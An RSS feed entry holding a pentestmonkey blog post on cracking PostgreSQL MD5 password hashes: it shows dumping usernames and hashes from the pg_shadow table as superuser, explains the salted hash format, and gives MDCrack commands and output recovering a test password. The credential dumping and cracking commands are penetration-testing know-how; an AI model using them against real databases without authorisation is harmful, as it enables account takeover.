<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>passwordcracking &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/passwordcracking/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 20 Aug 2011 16:03:28 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Cracking Postgres Password Hashes with MDCrack</title>
		<link>https://pentestmonkey.net/blog/cracking-postgres-hashes</link>
					<comments>https://pentestmonkey.net/blog/cracking-postgres-hashes#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 24 Jun 2007 20:50:23 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[mdcrack]]></category>
		<category><![CDATA[passwordcracking]]></category>
		<category><![CDATA[postgresql]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=15</guid>

					<description><![CDATA[As far as I&#8217;m aware there are aren&#8217;t many good password crackers around for PostgreSQL database password hashes.  Here are a few notes on how to crack postgres password hashes quickly using MDCrack.  Even though MDCrack is a Windows program, it works well enough under WINE for our purposes.  Linux users can therefore benefit from [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>As far as I&#8217;m aware there are aren&#8217;t many good password crackers around for <a href="http://www.postgresql.org/">PostgreSQL</a> database password hashes.  Here are a few notes on how to crack postgres password hashes quickly using MDCrack.  Even though <a href="http://membres.lycos.fr/mdcrack/">MDCrack</a> is a Windows program, it works well enough under <a href="http://www.winehq.org/">WINE</a> for our purposes.  Linux users can therefore benefit from its impressive cracking speeds.</p>
<p><span id="more-15"></span></p>
<h3>Where are the Hashes Kept?</h3>
<p>Postgres keeps MD5-based password hashes for database-level users in the pg_shadow table.  You need to be the database superuser to read this table (usually called &#8220;postgres&#8221; or &#8220;pgsql&#8221;).  First log into the database.  If you&#8217;ve gained local access to the Postgres server (e.g. via SSH), you&#8217;ll probably find that you don&#8217;t need a password to log in.  You will need a username and the name of a database, though.  The database &#8220;template1&#8221; always exists:</p>
<pre>$ psql -U postgres template1</pre>
<p>Then list the hashes:</p>
<pre># select usename, passwd from pg_shadow;
     usename      |  passwd               
------------------+-------------------------------------
 testuser         | md5fabb6d7172aadfda4753bf0507ed4396</pre>
<pre>...</pre>
<p>The passwd field in this table is MD5(password || username) &#8211; where || denotes concatenation.   In this example the passwd field for testuser contains &#8220;md5&#8221; || MD5(m4gictestuser).</p>
<h3>Cracking Hashes</h3>
<p>Download the latest version of <a href="http://membres.lycos.fr/mdcrack/">MDCrack</a>.  If you&#8217;re running Linux, then run it under WINE.  You&#8217;ll need to tell MDCrack to append the username to the end of each candidate password:</p>
<pre>$ wine MDCrack-sse.exe --algorithm=MD5 --append=testuser fabb6d7172aadfda4753bf0507ed4396

System / Starting MDCrack v1.8(3)
System / Running as MDCrack-sse.exe --algorithm=MD5 --append=testuser fabb6d7172aadfda4753bf0507ed4396
System / Charset is: abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
System / Detected processor(s): 2 x unknown | 3D-Now | MMX | SSE | SSE2
System / Target hash: fabb6d7172aadfda4753bf0507ed4396
System / &gt;&gt; Using MD5 cores: maximal candidate/user salt size: 16/54 bytes
Info   / Press ESC for available runtime shortcuts (Ctrl-c to quit)
Info   / Thread #0: &gt;&gt; Using Core 2
Info   / Thread #1: &gt;&gt; Using Core 2
Info   / Thread #0: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  1 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  2 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  3 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  4 ( + user salt: 8 )
Info   / Thread #1: Candidate size:  5 ( + user salt: 8 )
Info   / Thread #0: Candidate size:  5 ( + user salt: 8 )
----------------------------------------------------------/ Thread #0 (Success) ----
System / Thread #0: Collision found: m4gictestuser
...</pre>
<h3>Performance</h3>
<p>When running under WINE MDCrack can rattle through nearly 20 million passwords per second on a (dual core) AMDx2 4200+.  It automatically utilises both processors.</p>
<pre>$ wine MDCrack-sse.exe --benchmark

System / Starting MDCrack v1.8(3)
System / Running as MDCrack-sse.exe --benchmark
System / Detected processor(s): 2 x 2.15 Ghz unknown | 3D-Now | MMX | SSE | SSE2
Warning/ Please wait, this benchmark should last around 1min 45s
Info   / Press Ctrl-c to skip a test

---------------------------------------------------------------/ MD4 / DH / 2 Threads ---------------------
Info   / Benchmarking ( pass #1 )... 33 178 408 ( 3.32e+007 ) h/s.
---------------------------------------------------------------/ MD5 / DH / 2 Threads ---------------------
Info   / Benchmarking ( pass #1 )... 19 703 399 ( 1.97e+007 ) h/s.
...</pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/cracking-postgres-hashes/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
